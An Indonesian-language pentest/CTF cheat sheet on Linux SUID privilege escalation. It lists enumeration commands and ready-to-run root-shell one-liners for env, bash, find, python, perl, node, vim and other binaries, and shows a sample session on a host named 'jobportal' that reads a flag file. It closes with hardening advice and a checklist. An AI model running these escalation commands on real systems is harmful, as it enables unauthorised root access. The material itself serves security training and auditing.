# Exploiting SUID (Set User ID Privilege Escalation)

> **Tujuan:** Memanfaatkan binary ber‑SUID milik **root** untuk mempertahankan **effective UID (euid=0)** dan mendapatkan shell sebagai **root**.

---

## Penjelasan Singkat

**SUID (Set User ID)** adalah bit permission pada file Unix/Linux yang menyebabkan file dieksekusi dengan **effective UID** pemilik file. Jika binary SUID dimiliki **root** dan dapat disalahgunakan, attacker dapat memperoleh **root shell**.

---

## Cari Binary SUID

```bash
find / -perm -4000 -type f 2>/dev/null
# Mencari semua file yang memiliki SUID bit
```

Verifikasi bit SUID (huruf `s` pada permission):

```bash
ls -la /usr/bin/find
# Output: -rwsr-xr-x 1 root root ... /usr/bin/find
#         ^ bit "s" menandakan SUID (berjalan sebagai root)
```

Tampilan **aman** (binary SUID wajar, tidak bisa diabuse):

```text
/usr/bin/passwd          ← wajar, passwd memang butuh SUID
/usr/bin/sudo            ← wajar, sudo memang butuh SUID
```

> `mount`, `su`, `chsh`, `chfn`, `newgrp`, `gpasswd` juga wajar — abaikan semuanya, fokus cari binary yang bisa spawn shell.

Tampilan **rentan** (ada binary SUID yang bisa spawn shell):

```text
www-data@jobportal:~$ find / -perm -4000 -type f 2>/dev/null

# --- shell langsung ---
/usr/bin/env               ← RENTAN! env /bin/sh -p
/usr/bin/bash              ← RENTAN! bash -p
/usr/bin/find              ← RENTAN! -exec /bin/sh -p
/usr/bin/xargs             ← RENTAN! xargs /bin/sh -p
/usr/bin/time              ← RENTAN! time /bin/sh -p
/usr/bin/timeout           ← RENTAN! timeout 0 /bin/sh -p

# --- editor & pager (shell escape) ---
/usr/bin/vim               ← RENTAN! :!/bin/sh -p
/usr/bin/less              ← RENTAN! !/bin/sh -p
/usr/bin/more              ← RENTAN! !/bin/sh -p
/usr/bin/man               ← RENTAN! man membuka pager less/more
/usr/bin/journalctl        ← RENTAN! output panjang dibuka via pager

# --- interpreter (spawn shell via script) ---
/usr/bin/python3           ← RENTAN! os.setuid(0) + exec shell
/usr/bin/perl              ← RENTAN! setuid(0) + exec shell
/usr/bin/ruby              ← RENTAN! Process.setuid(0) + exec
/usr/bin/node              ← RENTAN! process.setuid(0) + spawn
/usr/bin/php               ← RENTAN! exec shell via script
/usr/bin/lua               ← RENTAN! os.execute("/bin/sh -p")
/usr/bin/awk               ← RENTAN! system("/bin/sh -p")
```

> **Catatan:** Daftar di atas difokuskan hanya ke binary yang **langsung memberi shell**. Binary lain seperti `cp`, `tee`, `tar`, `zip`, `wget`, `curl`, `docker`, `nmap` tetap bisa diabuse (menimpa/membaca file sistem) — daftar lengkapnya di GTFOBins → bagian **SUID**. Cukup **satu** entry RENTAN untuk mendapatkan root shell.

Oneliner gabungan — cek SUID, sudo, dan capabilities **sekaligus** dalam satu command:

```bash
find / -perm -4000 -type f 2>/dev/null; sudo -l; getcap -r / 2>/dev/null
```

- `find / -perm -4000 -type f 2>/dev/null` → enumerasi binary SUID (vektor file ini)
- `sudo -l` → enumerasi permission sudoers → [Sudo.md](Sudo.md)
- `getcap -r / 2>/dev/null` → enumerasi capabilities → [Capabilities.md](Capabilities.md)

> **Catatan:** Separator `;` menjalankan ketiga command secara berurutan meskipun salah satunya gagal. Oneliner inilah yang dipakai pada PoC laporan (langkah eskalasi root) karena satu command langsung menyingkap ketiga vektor LPE sekaligus.

---

## Cek GTFOBins

Untuk tiap binary → cek di [https://gtfobins.github.io](https://gtfobins.github.io) bagian **SUID** untuk melihat apakah binary tersebut dapat disalahgunakan.

---

## Pola Umum Eksploitasi

```bash
# env — preserve euid via env
env /bin/sh -p

# bash — flag -p mempertahankan euid
bash -p

# find — shell dijalankan dengan euid
find . -name x -exec /bin/sh -p \; -quit

# xargs — exec shell tanpa argumen
xargs -a /dev/null /bin/sh -p

# time / timeout — exec shell via wrapper
time /bin/sh -p
timeout 0 /bin/sh -p

# less / more — ketik !/bin/sh -p di dalam pager
less /etc/profile
more /etc/profile

# man — pager dibuka otomatis, ketik !/bin/sh -p
man man

# journalctl — output panjang dibuka via pager, ketik !/bin/sh -p
journalctl

# python3 — setuid(0) lalu spawn shell
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'

# perl — setuid(0) lalu exec shell
perl -e 'use POSIX (setuid); setuid(0); exec "/bin/sh";'

# ruby — setuid(0) lalu exec shell
ruby -e 'Process.setuid(0); exec "/bin/sh"'

# node — setuid(0) lalu spawn shell
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: "inherit"})'

# php — setuid(0) lalu pcntl_exec shell
php -r 'posix_setuid(0); pcntl_exec("/bin/sh", ["-p"]);'

# lua — exec shell
lua -e 'os.execute("/bin/sh -p")'

# awk — system() menjalankan command
awk 'BEGIN{system("/bin/sh -p")}'

# vim — shell escape command-mode
vim -c ':!/bin/sh -p'
```

| Binary | Teknik | Catatan |
|--------|--------|---------|
| `env` | `env /bin/sh -p` | Preserve euid via env |
| `bash` | `bash -p` | Mempertahankan euid |
| `find` | `-exec /bin/sh -p \;` | Shell dijalankan dengan euid |
| `xargs` | `xargs -a /dev/null /bin/sh -p` | Exec shell tanpa argumen |
| `time`/`timeout` | `time /bin/sh -p` / `timeout 0 /bin/sh -p` | Exec shell via wrapper |
| `less`/`more`/`man`/`journalctl` | `!/bin/sh -p` di dalam pager | Pager shell escape |
| `vim` | `:!/bin/sh -p` | Shell escape command-mode |
| `python3` | `os.setuid(0)` + `execl` | Spawn shell via Python |
| `perl` | `POSIX setuid(0)` + `exec` | Spawn shell via Perl |
| `ruby` | `Process.setuid(0)` + `exec` | Spawn shell via Ruby |
| `node` | `process.setuid(0)` + `spawn` | Spawn shell via Node |
| `php` | `posix_setuid(0)` + `pcntl_exec` | Spawn shell via PHP |
| `lua` | `os.execute("/bin/sh -p")` | Spawn shell via Lua |
| `awk`/`mawk` | `system("/bin/sh -p")` | Menjalankan command |

---

## Contoh Tampilan Eksploitasi (Root Shell)

```text
www-data@jobportal:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root 32016 Feb  8  2024 /usr/bin/find
   ^ bit "s" = SUID, dimiliki root → binary ini berjalan sebagai root

www-data@jobportal:~$ find . -name "x" -exec /bin/sh -p \;
$ id
uid=33(www-data) euid=0(root) gid=33(www-data) groups=33(www-data)
$ whoami
root
$ cat /root/flag.txt
FLAG{suid_binary_leads_to_root}
```

> **Capture:** Eksploitasi berhasil — `euid=0(root)` muncul karena flag `-p` mempertahankan effective UID dari SUID. Shell aktif sebagai root dan flag di `/root/flag.txt` berhasil dibaca.

---

## Catatan Penting — Privilege Drop

Payload yang menggunakan `system()` → `/bin/sh` (dash) dapat **menurunkan privilege**.

### Solusi

- Gunakan binary yang melakukan `execve` langsung (`env`, `find`).
- Atau gunakan **`/bin/bash -p`** untuk mempertahankan euid.

> Beberapa shell seperti `dash` otomatis menurunkan privilege. Karena itu, shell yang digunakan harus mempertahankan **effective UID** agar privilege SUID tidak hilang.

---

## Alur Eksploitasi

```text
Cari SUID
    ↓
Identifikasi binary
    ↓
Cek GTFOBins → SUID
    ↓
Validasi permission & konfigurasi
    ↓
Uji teknik yang sesuai
    ↓
Verifikasi privilege dengan id
```

---

## Pengerasan Keamanan (Hardening)

- **Audit Rutin SUID** Lakukan audit berkala pada seluruh binary ber-SUID (`find / -perm -4000`) dan hapus bit SUID yang tidak diperlukan (`chmod u-s <binary>`).
- **Gunakan Allowlist** Batasi SUID hanya pada binary minimal esensial (`passwd`, `sudo`, `su`, `mount`).
- **Hindari Binary Interpreting** Jangan berikan bit SUID pada interpreter (python, perl, ruby, node) maupun editor (vim, awk) karena semuanya bisa spawn shell.

---

## Checklist SUID LPE

- [ ] Jalankan `find / -perm -4000 -type f 2>/dev/null`.
- [ ] Identifikasi binary SUID milik root.
- [ ] Cek di [GTFOBins](https://gtfobins.github.io) → bagian **SUID**.
- [ ] Pilih teknik yang tepat (`-p`, `exec`, `system`, dll.).
- [ ] Uji payload dan pastikan euid tetap 0.
- [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`.

---

## Referensi

- [GTFOBins – SUID](https://gtfobins.github.io/)
- [Linux Man Page – SUID](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
